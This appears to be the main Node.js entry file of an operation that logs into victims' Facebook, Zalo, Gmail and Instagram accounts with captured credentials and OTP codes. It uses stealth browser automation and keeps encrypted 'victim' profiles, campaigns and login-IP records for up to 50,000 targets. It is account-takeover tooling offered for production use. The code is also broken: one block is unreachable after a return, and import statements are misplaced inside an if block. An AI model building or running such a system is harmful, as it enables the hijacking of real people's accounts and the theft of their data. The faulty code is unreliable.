#!/usr/bin/env node

/**
 * Production-Ready Social Media Automation System
 * Main entry point cho production deployment
 */

import AutoLogin from "./libs/auto-login.js";
import VictimManager from "./libs/victims.js";
import AdminControl from "./libs/admin.js";
import ChromeAutomation from "./libs/chrome.js";
import BotSystem from "./libs/bot-system.js";
import SessionManager from "./libs/sessions.js";

// Production System Controller
class ProductionSystemController {
  constructor() {
    this.modules = {
      autoLogin: null,
      victimManager: null,
      adminControl: null,
      chromeAutomation: null,
      botSystem: null,
      sessionManager: null,
    };

    this.isInitialized = false;
    this.healthStatus = {
      status: "starting",
      modules: {},
      startTime: new Date().toISOString(),
      lastHealthCheck: null,
    };
  }

  // Initialize all production modules
  async initialize() {
    try {
      console.log(
        "🚀 Initializing Production Social Media Automation System..."
      );
      console.log(
        "================================================================"
      );

      // Initialize core modules in order
      await this.initializeAutoLogin();
      await this.initializeVictimManager();
      await this.initializeAdminControl();
      await this.initializeChromeAutomation();
      await this.initializeBotSystem();
      await this.initializeSessionManager();

      this.isInitialized = true;
      this.healthStatus.status = "running";
      this.healthStatus.lastHealthCheck = new Date().toISOString();

      console.log("✅ Production System fully initialized and ready!");
      console.log(
        "================================================================"
      );
      console.log("🎯 Available features:");
      console.log(
        "   🔐 Multi-platform authentication (Facebook, Zalo, Gmail, Instagram)"
      );
      console.log("   👥 Victim profile management với complete CRUD");
      console.log("   📊 Campaign execution và analytics");
      console.log("   🤖 Automated social media operations");
      console.log("   📱 Real-time admin monitoring và logging");
      console.log("   💾 Session persistence và management");

      return true;
      // Initialize Sync System if enabled
      if (process.argv.includes('--enable-sync') || process.env.ENABLE_SYNC === 'true') {
        console.log('🔄 Initializing Sync System...');
        
        try {
          const SyncIntegration = (await import('./backend/sync-integration.js')).default;
          const MonitoringDashboard = (await import('./backend/monitoring/dashboard.js')).default;
          
          const syncIntegration = new SyncIntegration(this.server || null);
          console.log('✅ Sync system initialized successfully');
          
          // Start monitoring dashboard
          const dashboard = new MonitoringDashboard(3002);
          dashboard.start();
          console.log('📊 Monitoring dashboard started on port 3002');
          
          // Store reference
          this.syncIntegration = syncIntegration;
          
        } catch (error) {
          console.error('❌ Failed to initialize sync system:', error);
        }
      } else {
        console.log('ℹ️ Sync system disabled (use --enable-sync to enable)');
      }

    } catch (error) {
      console.error("❌ Failed to initialize production system:", error);
      this.healthStatus.status = "error";
      this.healthStatus.error = error.message;
      return false;
    }
  }

  // Initialize AutoLogin module
  async initializeAutoLogin() {
    try {
      console.log("🔐 Initializing Auto Login system...");

      this.modules.autoLogin = new AutoLogin();
      await this.modules.autoLogin.initialize("production");

      this.healthStatus.modules.autoLogin = {
        status: "running",
        platforms: Object.keys(this.modules.autoLogin.platformModules),
        activeSessions: this.modules.autoLogin.activeSessions.size,
        lastCheck: new Date().toISOString(),
      };

      console.log("✅ Auto Login system initialized");
      console.log(
        `   Platforms: ${Object.keys(this.modules.autoLogin.platformModules).join(", ")}`
      );
    } catch (error) {
      console.error("❌ Auto Login initialization failed:", error);
      this.healthStatus.modules.autoLogin = {
        status: "error",
        error: error.message,
      };
      throw error;
    }
  }

  // Initialize VictimManager module
  async initializeVictimManager() {
    try {
      console.log("👥 Initializing Victim Management system...");

      this.modules.victimManager = new VictimManager({
        dataDir: "./production-data/victim-data",
        enableEncryption: true,
        enableAnalytics: true,
        maxProfiles: 50000,
        autoBackup: true,
      });

      await this.modules.victimManager.initialize();

      this.healthStatus.modules.victimManager = {
        status: "running",
        profileCount: this.modules.victimManager.profiles.size,
        campaignCount: this.modules.victimManager.campaigns.size,
        lastCheck: new Date().toISOString(),
      };

      console.log("✅ Victim Management system initialized");
      console.log(`   Profiles: ${this.modules.victimManager.profiles.size}`);
      console.log(`   Campaigns: ${this.modules.victimManager.campaigns.size}`);
    } catch (error) {
      console.error("❌ Victim Management initialization failed:", error);
      this.healthStatus.modules.victimManager = {
        status: "error",
        error: error.message,
      };
      throw error;
    }
  }

  // Initialize AdminControl module
  async initializeAdminControl() {
    try {
      console.log("⚙️ Initializing Admin Control system...");

      this.modules.adminControl = new AdminControl({
        maxConcurrentOperations: 20,
        enableRealTimeMonitoring: true,
        enableCommandHistory: true,
        dataDir: "./production-data/admin-data",
      });

      await this.modules.adminControl.initialize();

      this.healthStatus.modules.adminControl = {
        status: "running",
        activeOperations: this.modules.adminControl.operations.size,
        lastCheck: new Date().toISOString(),
      };

      console.log("✅ Admin Control system initialized");
    } catch (error) {
      console.error("❌ Admin Control initialization failed:", error);
      this.healthStatus.modules.adminControl = {
        status: "error",
        error: error.message,
      };
      // Non-critical, continue
    }
  }

  // Initialize ChromeAutomation module
  async initializeChromeAutomation() {
    try {
      console.log("🌐 Initializing Chrome Automation system...");

      this.modules.chromeAutomation = new ChromeAutomation({
        maxInstances: 10,
        enableStealth: true,
        enableProxy: false,
        userDataDir: "./production-data/browser-profiles",
      });

      await this.modules.chromeAutomation.initialize();

      this.healthStatus.modules.chromeAutomation = {
        status: "running",
        activeInstances: this.modules.chromeAutomation.instances.size,
        lastCheck: new Date().toISOString(),
      };

      console.log("✅ Chrome Automation system initialized");
    } catch (error) {
      console.error("❌ Chrome Automation initialization failed:", error);
      this.healthStatus.modules.chromeAutomation = {
        status: "error",
        error: error.message,
      };
      // Non-critical, continue
    }
  }

  // Initialize BotSystem module
  async initializeBotSystem() {
    try {
      console.log("🤖 Initializing Bot System...");

      this.modules.botSystem = new BotSystem();
      await this.modules.botSystem.initialize();

      this.healthStatus.modules.botSystem = {
        status: "running",
        botCount: this.modules.botSystem.bots?.size || 0,
        lastCheck: new Date().toISOString(),
      };

      console.log("✅ Bot System initialized");
    } catch (error) {
      console.error("❌ Bot System initialization failed:", error);
      this.healthStatus.modules.botSystem = {
        status: "error",
        error: error.message,
      };
      // Non-critical, continue
    }
  }

  // Initialize SessionManager module
  async initializeSessionManager() {
    try {
      console.log("💾 Initializing Session Manager...");

      this.modules.sessionManager = new SessionManager({
        dataDir: "./production-data/sessions",
        enableEncryption: true,
        autoCleanup: true,
      });

      await this.modules.sessionManager.initialize();

      this.healthStatus.modules.sessionManager = {
        status: "running",
        activeSessions: this.modules.sessionManager.sessions?.size || 0,
        lastCheck: new Date().toISOString(),
      };

      console.log("✅ Session Manager initialized");
    } catch (error) {
      console.error("❌ Session Manager initialization failed:", error);
      this.healthStatus.modules.sessionManager = {
        status: "error",
        error: error.message,
      };
      // Non-critical, continue
    }
  }

  // Execute coordinated operation (authentication + victim management)
  async executeCoordinatedOperation(operation) {
    try {
      const { platform, credentials, victimProfile, campaignId } = operation;

      console.log(
        `🎯 Executing coordinated operation: ${platform} -> ${victimProfile?.name || "unknown"}`
      );

      // Step 1: Authenticate to platform
      const loginResult = await this.modules.autoLogin.login(
        platform,
        credentials
      );

      if (!loginResult.success) {
        throw new Error(`Authentication failed: ${loginResult.error}`);
      }

      // Step 2: Create or update victim profile
      let profileResult = null;
      if (victimProfile) {
        if (victimProfile.id) {
          profileResult = await this.modules.victimManager.updateProfile(
            victimProfile.id,
            { ...victimProfile, lastLoginIP: loginResult.ip }
          );
        } else {
          profileResult = await this.modules.victimManager.createProfile({
            ...victimProfile,
            platform,
            lastLoginIP: loginResult.ip,
            accountCredentials: {
              username: credentials.username || credentials.email,
              authenticatedAt: new Date().toISOString(),
            },
          });
        }
      }

      // Step 3: Add interaction record
      if (profileResult) {
        await this.modules.victimManager.addInteraction(profileResult.id, {
          type: "authentication",
          platform,
          success: true,
          response: loginResult,
          campaignId,
        });
      }

      // Log coordinated operation
      try {
        const { addHistoryLog } = await import(
          "../backend/routes/admin.js"
        );

        await addHistoryLog({
          platform,
          action: "coordinatedOperation",
          status: "success",
          linkName: `${platform} Coordinated Operation`,
          account:
            credentials.username || credentials.email || credentials.phone,
          password: "***MASKED***",
          otpCode: credentials.otpCode || "N/A",
          loginIP: loginResult.ip,
          chromeProfile: operation.chromeProfile || "Default",
          notification: `✅ Coordinated operation completed: Login + Profile management`,
          victimControlAction: "coordinate",
          user: operation.executor || "system",
          message: `Coordinated operation: ${platform} authentication + victim profile management`,
          metadata: {
            loginSuccess: loginResult.success,
            profileUpdated: !!profileResult,
            campaignId,
            profileId: profileResult?.id,
            targetName: victimProfile?.name,
            operationType: "coordinated",
          },
          category: "coordination",
        });
      } catch (logError) {
        console.warn(
          "⚠️ Failed to log coordinated operation:",
          logError.message
        );
      }

      return {
        success: true,
        login: loginResult,
        profile: profileResult,
        message: "Coordinated operation completed successfully",
      };
    } catch (error) {
      console.error("❌ Coordinated operation failed:", error);

      // Log failed coordinated operation
      try {
        const { addHistoryLog } = await import(
          "../backend/routes/admin.js"
        );

        await addHistoryLog({
          platform: operation.platform,
          action: "coordinatedOperation",
          status: "failed",
          linkName: `${operation.platform} Coordinated Operation`,
          account:
            operation.credentials?.username || operation.credentials?.email,
          password: "***AUTH_ERROR***",
          otpCode: "N/A",
          loginIP: "unknown",
          chromeProfile: operation.chromeProfile || "Default",
          notification: `❌ Coordinated operation failed: ${error.message}`,
          victimControlAction: "coordinate",
          user: operation.executor || "system",
          message: `Coordinated operation failed: ${error.message}`,
          metadata: {
            error: error.message,
            operationType: "coordinated",
            failureStage: "coordination",
          },
          category: "coordination",
        });
      } catch (logError) {
        console.warn(
          "⚠️ Failed to log failed coordinated operation:",
          logError.message
        );
      }

      return {
        success: false,
        error: error.message,
      };
    }
  }

  // Get system health status
  getHealthStatus() {
    return {
      ...this.healthStatus,
      uptime: Date.now() - new Date(this.healthStatus.startTime).getTime(),
      lastCheck: new Date().toISOString(),
    };
  }

  // Graceful shutdown
  async shutdown() {
    try {
      console.log("🛑 Shutting down production system...");

      // Close all modules gracefully
      for (const [name, module] of Object.entries(this.modules)) {
        if (module && typeof module.close === "function") {
          try {
            await module.close();
            console.log(`✅ ${name} shut down gracefully`);
          } catch (error) {
            console.error(`❌ Failed to shut down ${name}:`, error);
          }
        }
      }

      console.log("✅ Production system shut down complete");
    } catch (error) {
      console.error("❌ Error during shutdown:", error);
    }
  }
}

// Global production system instance
let productionSystem = null;

// Initialize production system
export async function initializeProductionSystem() {
  if (productionSystem) {
    return productionSystem;
  }

  productionSystem = new ProductionSystemController();
  const initialized = await productionSystem.initialize();

  if (!initialized) {
    throw new Error("Failed to initialize production system");
  }

  return productionSystem;
}

// Get production system instance
export function getProductionSystem() {
  return productionSystem;
}

// Health check endpoint
export function getSystemHealth() {
  if (!productionSystem) {
    return {
      status: "not_initialized",
      timestamp: new Date().toISOString(),
    };
  }

  return productionSystem.getHealthStatus();
}

// Graceful shutdown
export async function shutdownProductionSystem() {
  if (productionSystem) {
    await productionSystem.shutdown();
    productionSystem = null;
  }
}

// Handle process signals for graceful shutdown
process.on("SIGTERM", async () => {
  console.log("📡 SIGTERM received, shutting down gracefully...");
  await shutdownProductionSystem();
  process.exit(0);
});

process.on("SIGINT", async () => {
  console.log("📡 SIGINT received, shutting down gracefully...");
  await shutdownProductionSystem();
  process.exit(0);
});

// Handle uncaught exceptions
process.on("uncaughtException", async (error) => {
  console.error("💥 Uncaught Exception:", error);
  await shutdownProductionSystem();
  process.exit(1);
});

process.on("unhandledRejection", async (reason, promise) => {
  console.error("💥 Unhandled Rejection at:", promise, "reason:", reason);
  await shutdownProductionSystem();
  process.exit(1);
});

// Main execution when run directly
if (import.meta.url === `file://${process.argv[1]}`) {

// Sync System Integration
import SyncIntegration from './backend/sync-integration.js';
import MonitoringDashboard from './backend/monitoring/dashboard.js';
  console.log("🚀 Starting Production Social Media Automation System");
  console.log("====================================================");

  initializeProductionSystem()
    .then((system) => {
      console.log("🎉 Production system is running!");
      console.log("📊 Health status:", system.getHealthStatus().status);

      // Keep process alive
      setInterval(() => {
        const health = system.getHealthStatus();
        console.log(
          `📊 System Health: ${health.status} | Uptime: ${Math.round(health.uptime / 1000)}s`
        );
      }, 60000); // Health check every minute
    })
    .catch((error) => {
      console.error("❌ Failed to start production system:", error);
      process.exit(1);
    });
}

export default ProductionSystemController;
